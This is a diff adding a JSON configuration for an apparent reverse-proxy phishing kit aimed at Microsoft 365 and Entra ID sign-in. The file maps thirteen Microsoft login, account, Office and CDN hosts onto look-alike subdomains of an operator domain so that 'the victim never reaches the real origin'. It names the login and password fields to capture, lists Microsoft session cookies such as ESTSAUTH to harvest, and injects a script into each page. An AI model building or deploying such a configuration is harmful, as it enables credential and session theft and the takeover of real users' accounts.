@@ -1,0 +1,40 @@
+{
+  "id": "microsoft",
+  "name": "Microsoft 365 / Entra ID",
+  "description": "Microsoft authentication chain including the CDN + office subdomains. Every original host is mapped 1:1 to a phishing subdomain under the operator base domain (ms.test) so HTML/JS/redirect references are rewritten and the victim never reaches the real origin.",
+  "redirect_url": "/",
+  "force_https": true,
+  "require_lure": false,
+  "enabled": true,
+  "username_field": "login",
+  "password_field": "passwd",
+  "login_urls": ["/"],
+  "auth_urls": ["/"],
+  "routing_matrix": [
+    { "upstream": "login.microsoftonline.com", "proxy_host": "login.ms.test", "is_primary": true },
+    { "upstream": "login.microsoft.com", "proxy_host": "login-microsoft.ms.test" },
+    { "upstream": "login.live.com", "proxy_host": "login-live.ms.test" },
+    { "upstream": "account.live.com", "proxy_host": "account-live.ms.test" },
+    { "upstream": "account.microsoft.com", "proxy_host": "account-microsoft.ms.test" },
+    { "upstream": "www.office.com", "proxy_host": "www.office.ms.test" },
+    { "upstream": "office.com", "proxy_host": "office.ms.test" },
+    { "upstream": "m365.cloud.microsoft", "proxy_host": "m365-cloud.microsoft.ms.test" },
+    { "upstream": "outlook.live.com", "proxy_host": "outlook-live.ms.test" },
+    { "upstream": "auth.gfx.ms", "proxy_host": "auth-gfx.ms.test" },
+    { "upstream": "logincdn.msftauth.net", "proxy_host": "logincdn.ms.test" },
+    { "upstream": "aadcdn.msftauth.net", "proxy_host": "aadcdn.ms.test" },
+    { "upstream": "aadcdn.msauth.net", "proxy_host": "aadcdn-auth.ms.test" }
+  ],
+  "cookie_tracking": [
+    { "domain": "login.microsoftonline.com", "name": "ESTSAUTH" },
+    { "domain": "login.microsoftonline.com", "name": "ESTSAUTHPERSISTENT" },
+    { "domain": "login.microsoftonline.com", "name": "SignInStateCookie" },
+    { "domain": "login.microsoftonline.com", "name": "esctx" },
+    { "domain": "login.microsoftonline.com", "name": "x-ms-gateway-slice" },
+    { "domain": "login.microsoftonline.com", "name": "stsservicecookie" }
+  ],
+  "telemetry_injection": {
+    "position": "head",
+    "code": "window.__ep_session=document.cookie.match(/EP_SESS=([^;]+)/)?document.cookie.match(/EP_SESS=([^;]+)/)[1]:null;"
+  }
+}
